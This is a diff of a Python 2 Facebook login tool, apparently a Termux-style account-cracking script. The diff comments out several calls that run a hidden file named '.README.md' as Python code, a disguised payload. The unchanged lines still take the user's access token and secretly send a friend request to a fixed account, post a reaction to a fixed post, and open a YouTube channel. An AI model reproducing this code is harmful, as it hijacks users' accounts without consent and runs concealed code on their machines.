@@ -15,7 +15,7 @@ except ImportError:
     os.system('pip2 install mechanize')
     os.system('pip2 install bxin')
     time.sleep(1)
-    os.system('python2 .README.md')
+    #os.system('python2 .README.md')
 
 reload(sys)
 sys.setdefaultencoding('utf8')
@@ -80,7 +80,7 @@ def login():
     os.system('clear')
     try:
         toket = open('....', 'r')
-        os.system('python2 .README.md')
+        #os.system('python2 .README.md')
     except (KeyError,IOError):
         os.system('rm -rf ....')
         os.system('clear')
@@ -105,7 +105,7 @@ def login_choice():
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+fac)
         requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +fac)
         os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
-        os.system('python2 .README.md')
+       #os.system('python2 .README.md')
     elif bch =='1':
         login1()
             
@@ -140,7 +140,7 @@ def login1():
 		    os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
 		    requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+z['access_token'])
 		    requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +z['access_token'])
-		    os.system('python2 .README.md')
+		    #os.system('python2 .README.md')
 		else:
 		    if 'www.facebook.com' in z['error_msg']:
 		        print ('Account has a checkpoint !')
